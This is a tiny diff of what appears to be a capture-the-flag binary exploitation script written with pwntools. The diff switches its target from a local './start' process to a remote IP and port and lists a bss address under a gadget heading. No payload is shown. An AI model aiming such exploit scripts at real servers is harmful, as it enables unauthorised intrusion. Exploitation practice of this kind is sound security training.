@@ -1,6 +1,6 @@
 from pwn import*
-p = process('./start')
-
+#p = process('./start')
+p = remote('35.201.210.117',9001)
 ### Gadget
 bss_addr = 0x602040
 
